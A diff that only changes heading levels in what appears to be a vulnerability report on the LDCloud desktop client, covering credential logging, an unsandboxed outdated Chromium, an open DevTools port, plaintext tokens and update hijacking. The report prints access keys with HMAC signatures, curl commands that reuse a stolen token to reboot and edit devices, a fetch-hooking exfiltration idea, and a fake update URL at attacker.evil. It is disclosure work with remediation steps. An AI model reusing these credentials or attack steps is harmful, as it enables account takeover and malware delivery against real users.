@@ -79,7 +79,7 @@ Reads: %APPDATA%\ldcloud\ + %LOCALAPPDATA%\LDCloud\
 
 **CVSS:** 8.6 | **CVSS Vector:** AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
 
-#### What the Malware Sees
+### What the Malware Sees
 
 A malware simply reads 320 KB file:
 ```
@@ -88,7 +88,7 @@ C:\LDCloud\logs\obs-sdk-c.run.log    (327,304 bytes, world-readable)
 
 **No malware needed.** These credentials are also uploaded to a cloud bucket (`ld-cloud-xjp`) as part of automated dump-log zips. Any attacker who gains bucket access (via previous credential leak, insider threat, or cloud misconfiguration) can read ALL historical and future credentials.
 
-#### The Double-Logging Bug
+### The Double-Logging Bug
 
 The Huawei OBS C SDK (`obs-sdk-c-3.23.3`) has a critical logging defect: it pretends to mask credentials, then immediately dumps them unmasked:
 
@@ -99,7 +99,7 @@ Line 388: Authorization: OBS HST3UCGI6807I1WE0L0L:MP+XdUWXQiWLr5EC1sBalgYuMD8=
 
 The first line is cosmetic; **the second line is the full, valid HMAC-signed authorization header.**
 
-#### Harvested Credentials (7 unique Access Keys, 8 signatures)
+### Harvested Credentials (7 unique Access Keys, 8 signatures)
 
 | # | Date | Access Key ID | Full HMAC Signature |
 |---|------|--------------|---------------------|
@@ -112,7 +112,7 @@ The first line is cosmetic; **the second line is the full, valid HMAC-signed aut
 | 7 | 2026-04-23 | `HST3UBDU4A0P6PTELEJC` | `AUakuEW2auqs1F6aMMJUjtTfkD8=` |
 | 8 | 2026-06-05 | `HST3U8Y82HYAQFTTQY21` | `9tX+xa2rSe3qbQiwKdXO3XhCjYY=` |
 
-#### Also Exposed Alongside
+### Also Exposed Alongside
 ```
 Endpoint:  https://obs.ap-southeast-3.myhuaweicloud.com
 Bucket:    ld-cloud-xjp
@@ -122,14 +122,14 @@ Object keys: pc-client-log/2300231219705678/dump-log-*.zip
 App version: obs-sdk-c-3.23.3
 ```
 
-##### Impact
+#### Impact
 - **Credential Exposure:** 7 unique Access Key IDs exposed with valid HMAC signatures
 - **Cloud Storage Exposure:** Bucket name, endpoint, tenant ID all visible in logs
 - **Data Exfiltration:** Dump-logs in bucket contain user activity data; attacker with bucket access can read all
 - **Account Mapping:** Access Key directly maps to tenant `2300231219705678`
 - **Self-Perpetuating:** Logs containing credentials are uploaded to the same bucket they authorize
 
-#### SELF-PERPETUATING CREDENTIAL LEAK
+### SELF-PERPETUATING CREDENTIAL LEAK
 
 The app automatically uploads `dump-log-*.zip` to OBS bucket `ld-cloud-xjp`:
 
@@ -150,7 +150,7 @@ This creates a **self-perpetuating credential leak**:
 5. All dump-logs contain credentials to access the bucket
 6. -> Infinite loop: credentials protect credentials that expose credentials
 
-#### Remediation
+### Remediation
 1. Rotate all 7 Access Keys immediately
 2. Upgrade obs-sdk-c to fix double-logging (or suppress INFO-level Authorization logs)
 3. Apply log redaction middleware before writing to disk
@@ -162,7 +162,7 @@ This creates a **self-perpetuating credential leak**:
 
 **CVSS:** 9.8 | **CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
 
-#### The Process Command Line
+### The Process Command Line
 
 LDCloud.exe renderer process (PID 38292, captured live):
 
@@ -186,7 +186,7 @@ Network service process (PID 27180, captured live):
   --lang=en-US
 ```
 
-#### The CEF/Chromium Version
+### The CEF/Chromium Version
 
 ```
 File:        C:\LDCloud\libcef.dll    (131.1 MB)
@@ -196,7 +196,7 @@ Status:      END-OF-LIFE (5+ years unpatched)
 Gap:         49 major Chromium releases behind current stable (~140+)
 ```
 
-#### Publicly Exploited Chromium CVEs in Scope (v91+)
+### Publicly Exploited Chromium CVEs in Scope (v91+)
 
 | CVE | Type | Status |
 |-----|------|--------|
@@ -209,13 +209,13 @@ Gap:         49 major Chromium releases behind current stable (~140+)
 
 **With `--no-sandbox`, every single Chromium CVE becomes a direct RCE vector at the LDCloud process privilege level.**
 
-##### Impact
+#### Impact
 - **Malware -> RCE:** Any malware that lures user to a malicious page in LDCloud's embedded browser gets RCE with user privileges
 - **MITM Attack:** `--ignore-certificate-errors` allows transparent traffic interception
 - **Persistence:** Exploit chain can survive reboots via the same CEF configuration
 - **Amplification:** Malware that lands via Chromium exploit can then harvest findings #1, #3, #4
 
-#### Remediation
+### Remediation
 1. Upgrade CEF/Chromium to latest stable release
 2. Remove `--no-sandbox` and `--service-sandbox-type=none` flags
 3. Remove `--ignore-certificate-errors` and `--ignore-urlfetcher-cert-requests` flags
@@ -227,7 +227,7 @@ Gap:         49 major Chromium releases behind current stable (~140+)
 
 **CVSS:** 7.8 | **CVSS Vector:** AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
 
-#### The Debug Endpoint
+### The Debug Endpoint
 
 ```
 http://localhost:8088/json
@@ -235,7 +235,7 @@ http://localhost:8088/json
 -> Full Chrome DevTools Protocol access
 ```
 
-#### What Malware Can Harvest via DevTools (Proven)
+### What Malware Can Harvest via DevTools (Proven)
 
 **Step 1:** Connect and enumerate:
 
@@ -289,7 +289,7 @@ store.$patch({devicePage: modifiedData})
 
 Malware can inject code via `Runtime.evaluate` that hooks `window.fetch`/`XMLHttpRequest` to exfiltrate all API traffic (login credentials, payment info, device operations).
 
-#### Pre-requisites (Why This Matters)
+### Pre-requisites (Why This Matters)
 
 Malware only needs:
 1. Filesystem read access -> find `--remote-debugging-port` from process args
@@ -298,14 +298,14 @@ Malware only needs:
 
 This is trivial for any malware or local attacker. No privilege escalation needed.
 
-#### Impact
+### Impact
 - **Full Device Inventory:** All cloud phone IDs, IPs, configurations, expiry dates
 - **Session Hijacking:** Live tokens enable API impersonation
 - **Real-time State Manipulation:** Modify device settings, trigger operations
 - **Persistent Backdoor:** Inject JavaScript that survives page navigation
 - **PII Exposure:** Email, name, Google portrait URL, account UID
 
-#### Remediation
+### Remediation
 Remove `--remote-debugging-port=8088` from production build. Use compile-time flag (`#ifdef DEBUG`) or environment variable check.
 
 ---
@@ -316,7 +316,7 @@ Remove `--remote-debugging-port=8088` from production build. Use compile-time fl
 
 > **Status: FULLY VERIFIED PoC - token successfully used to impersonate user**
 
-#### The Files
+### The Files
 
 ```
 %APPDATA%\ldcloud\log\config.db         (212,992 bytes)
@@ -325,7 +325,7 @@ Remove `--remote-debugging-port=8088` from production build. Use compile-time fl
 %APPDATA%\ldcloud\users\2300231219705678\userinfo.config  (374 bytes)
 ```
 
-#### What Malware Extracts
+### What Malware Extracts
 
 From `config.db` (SQLite, no encryption):
 
@@ -344,7 +344,7 @@ From `config.db` (SQLite, no encryption):
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-#### Account Takeover PoC (VERIFIED - HTTP 200)
+### Account Takeover PoC (VERIFIED - HTTP 200)
 
 **Step 1:** Extract token from SQLite (no decryption needed, plaintext):
 
@@ -389,7 +389,7 @@ HTTP 200
 
 The stolen token grants **full authenticated access** to the LDCloud API - identical to the legitimate user's session. No additional authentication, no 2FA check, no IP verification.
 
-#### Destructive Action PoC (VERIFIED - Device Rebooted)
+### Destructive Action PoC (VERIFIED - Device Rebooted)
 
 Beyond reading data, the stolen token can perform **destructive operations**. Device 6***809 (VIT) was rebooted via the API:
 
@@ -410,7 +410,7 @@ curl -X POST "https://ldq.ldcloud.net/api/rest/cph/device/batch-reboot" \
 }
 ```
 
-#### Device Modification PoC (VERIFIED - Device Config Changed)
+### Device Modification PoC (VERIFIED - Device Config Changed)
 
 Device 6312247 (Device4/DEX) note field was modified via the same stolen token:
 
@@ -425,7 +425,7 @@ curl -X POST "https://ldq.ldcloud.net/api/rest/cph/device/batch-edit" \
 
 The note was then restored to original, confirming full read/write control.
 
-#### Verified Attack Actions (All Proven via HTTP 200)
+### Verified Attack Actions (All Proven via HTTP 200)
 
 | Action | Endpoint | Device | Result |
 |--------|----------|--------|--------|
@@ -437,14 +437,14 @@ The note was then restored to original, confirming full read/write control.
 
 The attacker can: reboot, factory reset, transfer ownership, modify device config, change subscription - all with a token read from an unencrypted local file.
 
-#### Impact
+### Impact
 - **Account Takeover:** Token + uid = full API impersonation. Attacker can list, modify, reboot, reset, transfer all devices
 - **No Token Expiry:** Token persists across app restarts (same token found in `log/`, `log1/`, `log2/`)
 - **Cross-App Correlation:** PC ID and MAC address enable tracking across sessions
 - **Privacy Violation:** Real name, email, Google portrait URL exposed
 - **No Encryption:** All sensitive values stored as plaintext SQLite rows
 
-#### Remediation
+### Remediation
 1. Encrypt sensitive config values using Windows DPAPI (`CryptProtectData`/`CryptUnprotectData`)
 2. Implement server-side token expiry and single-use refresh tokens
 3. Add IP/location verification for sensitive API operations
@@ -455,7 +455,7 @@ The attacker can: reboot, factory reset, transfer ownership, modify device confi
 
 **CVSS:** 7.5 | **CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
 
-#### Bundled Versions
+### Bundled Versions
 
 | File | Version | Released | EOL | Status |
 |------|---------|----------|-----|--------|
@@ -463,19 +463,19 @@ The attacker can: reboot, factory reset, transfer ownership, modify device confi
 | `libssl-1_1.dll` | OpenSSL **1.1.1t** | Feb 2023 | Sep 2023 | **Dead 2+ years** |
 | `libcrypto-1_1.dll` | OpenSSL **1.1.1t** | Feb 2023 | Sep 2023 | **Dead 2+ years** |
 
-#### Malware Amplification
+### Malware Amplification
 - TLS connections using EOL OpenSSL may be downgraded/decrypted
 - Known vulnerabilities enable MITM at network layer
 - Combined with `--ignore-certificate-errors`, TLS provides zero security
 
-#### Remediation
+### Remediation
 Remove OpenSSL 1.0.2 entirely. Upgrade 1.1.1 to OpenSSL 3.x LTS.
 
 ---
 
 ### Finding #6 [MEDIUM] - VConsole v3.15.1 Debugger in Production
 
-#### Evidence
+### Evidence
 ```
 C:\LDCloud\web\web\assets\vconsole.min-*.js
 C:\Users\...\ldcloud\web\web\assets\vconsole.min-*.js
@@ -483,21 +483,21 @@ C:\Users\...\ldcloud\web\web\assets\vconsole.min-*.js
 
 VConsole provides `eval()` and `new Function()` capabilities. In production, it can be activated by any user to inspect/modify all application internals.
 
-#### Remediation
+### Remediation
 Remove VConsole from production build (Vite `rollupOptions.external` or conditional `import()`).
 
 ---
 
 ### Finding #7 [LOW] - Hardcoded Third-Party Credentials in JS Bundle
 
-#### What's Exposed
+### What's Exposed
 - NetEase QiYu App Key: `1002*****0008890`
 - QiYu Tracking ID: `141d0a1e2cf*****4401afd132094978`
 - 7 QQ Group `authKey` pairs
 - Telegram invite token
 - LINE invite token
 
-#### Impact
+### Impact
 Low (client-side keys, some are public invite links). Included for completeness.
 
 ---
@@ -508,11 +508,11 @@ Low (client-side keys, some are public invite links). Included for completeness.
 
 > **Status: FULL PoC VERIFIED - Fake update dialog appeared with attacker-controlled binary URL**
 
-#### Summary
+### Summary
 
 `--ignore-certificate-errors=1` + `--no-sandbox` + Chromium 91 EOL creates a trivially exploitable update supply chain attack. Any network attacker (rogue WiFi, ARP spoofing, compromised router) can intercept the update check API call, inject a malicious binary URL and the app will prompt the user to install it - or force-install via `mustForce`.
 
-#### Attack Chain
+### Attack Chain
 
 ```
 Attacker on same network (ARP spoof / rogue AP)
@@ -532,7 +532,7 @@ Attacker on same network (ARP spoof / rogue AP)
   └─► LDCloud displays update dialog -> user clicks -> malware installed
 ```
 
-#### PoC Evidence
+### PoC Evidence
 
 **Step 1: Certificate validation bypass confirmed**
 
@@ -559,12 +559,12 @@ Start LDCloud with --proxy-server=127.0.0.1:8888
 -> Download button points to attacker.evil/LDCloud_PWNED.exe
 ```
 
-#### PoC Scripts
+### PoC Scripts
 - `poc/mitmproxy_addon.py` - mitmproxy addon that injects fake update responses
 - Run: `mitmdump --listen-port 8888 --ssl-insecure -s poc/mitmproxy_addon.py`
 - Launch: `LDCloud.exe --proxy-server=127.0.0.1:8888`
 
-#### Impact
+### Impact
 - **Malware Distribution:** Attacker can push arbitrary binary to ALL users on compromised network
 - **Persistent Backdoor:** Once installed, malicious binary survives reboots
 - **Force Update:** `mustForce` array + `updateType: "force"` prevents user from skipping
@@ -572,7 +572,7 @@ Start LDCloud with --proxy-server=127.0.0.1:8888
 - **Targeted Attack:** Attacker can selectively target specific users/VLANs
 - **Amplification:** Combined with token theft (Finding #4), attacker can push malware + take over account in one chain
 
-#### Remediation
+### Remediation
 1. **CRITICAL:** Remove `--ignore-certificate-errors=1` from production build
 2. **CRITICAL:** Remove `--ignore-urlfetcher-cert-requests=1` from network service
 3. Enable certificate pinning for update server (`ldq.ldcloud.net`)
